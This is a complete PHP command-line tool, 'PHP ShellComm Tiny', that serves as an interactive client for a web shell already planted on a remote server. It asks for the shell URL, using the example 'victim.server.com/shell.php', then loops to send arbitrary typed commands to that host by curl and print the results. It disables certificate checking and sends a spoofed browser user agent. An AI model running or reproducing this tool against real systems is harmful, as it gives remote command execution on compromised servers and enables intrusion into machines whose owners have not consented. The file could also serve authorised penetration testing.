<?php

#  ***************************************************************************
#  PHP Shellcomm: communicate with a remote shell
#  Copyright (C) <2017>  <Ivan Ariel Barrera Oro>
#
#  This program is free software: you can redistribute it and/or modify
#  it under the terms of the GNU General Public License as published by
#  the Free Software Foundation, either version 3 of the License, or
#  (at your option) any later version.
#
#  This program is distributed in the hope that it will be useful,
#  but WITHOUT ANY WARRANTY; without even the implied warranty of
#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#  GNU General Public License for more details.
#
#  You should have received a copy of the GNU General Public License
#  along with this program.  If not, see <http://www.gnu.org/licenses/>.
#
#  ***************************************************************************

const VERSION = '0.2.1';

function build_url($shell_url, $shell_param, $cmd) {
	return $shell_url . '?' . $shell_param . '=' . urlencode($cmd);
}

function get_curl_opts($url) {
	return array(
		CURLOPT_AUTOREFERER => 1,
		CURLOPT_MAXREDIRS => 20,
		CURLOPT_FOLLOWLOCATION => 0,
		CURLOPT_HEADER => 0,
		CURLOPT_FRESH_CONNECT => 1,
		CURLOPT_RETURNTRANSFER => 1,
		CURLOPT_FORBID_REUSE => 0,
		CURLOPT_TIMEOUT => 10,
		CURLOPT_SSL_VERIFYPEER => 0,
		CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20120101 Firefox/29.0',
		CURLOPT_URL => $url
	);
}

function bye() {
	exit(PHP_EOL . 'Bye!' . PHP_EOL);
}

$user = get_current_user();

echo "
______ _   _ ______   _____ _          _ _ _____                             _____ _             
| ___ \ | | || ___ \ /  ___| |        | | /  __ \                           |_   _(_)            
| |_/ / |_| || |_/ / \ `--.| |__   ___| | | /  \/ ___  _ __ ___  _ __ ___     | |  _ _ __  _   _ 
|  __/|  _  ||  __/   `--. \ '_ \ / _ \ | | |    / _ \| '_ ` _ \| '_ ` _ \    | | | | '_ \| | | |
| |   | | | || |     /\__/ / | | |  __/ | | \__/\ (_) | | | | | | | | | | |   | | | | | | | |_| |
\_|   \_| |_/\_|     \____/|_| |_|\___|_|_|\____/\___/|_| |_| |_|_| |_| |_|   \_/ |_|_| |_|\__, |
                                                                                            __/ |
                                                                                           |___/ 
";

echo 'PHP ShellComm Tiny v', VERSION,
		' by HacKan (https://hackan.net) - GNU GPL v3.0+', PHP_EOL,
		'Communicate with a remote shell with easy and more comfortable',
		PHP_EOL, PHP_EOL;

if (php_sapi_name() != 'cli') {
	die('Error: this script must be run as CLI');
}

while(true) {
	$shell_url = readline('Set remote shell URL with protocol but without parameters, ie: http://victim.server.com/shell.php: ');
	if (filter_var($shell_url, FILTER_VALIDATE_URL)) {
		break;
	} elseif ($shell_url === false) {
		bye();
	} else {
		echo 'The URL seems wrong, type it again please...', PHP_EOL;
	}
}
$shell_param = readline('Set remote shell parameter for command [cmd]: ');

$ch = curl_init();
$url_parsed = parse_url($shell_url);
$host = isset($url_parsed['host']) ? $url_parsed['host'] : 'shellcomm';

echo PHP_EOL,
		'Commands will execute in ', $shell_url, '?', $shell_param,
		'=<command>', PHP_EOL, PHP_EOL,
		'Entering shell, exit with CTRL+D...', PHP_EOL;

while(true) {

	$input = readline($user . '@' . $host . ':$ ');
	if($input === false){
		break;
	}

	$url = build_url($shell_url, $shell_param, $input);
	curl_setopt_array($ch, get_curl_opts($url));
	$response = curl_exec($ch);
	if(curl_errno($ch)) {
		echo 'Error #', curl_errno($ch), ': ', curl_error($ch), PHP_EOL;
	} else {
		$http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
		if ($http_code == 200) {
			echo $response, PHP_EOL;
		} else {
			echo '>>> Got a http code ', $http_code, ' and the response is', (
				empty($response)
					? ' empty.' . PHP_EOL
					: ':' . PHP_EOL . $response . PHP_EOL
			);
		}
	}
}

curl_close($ch);
bye();
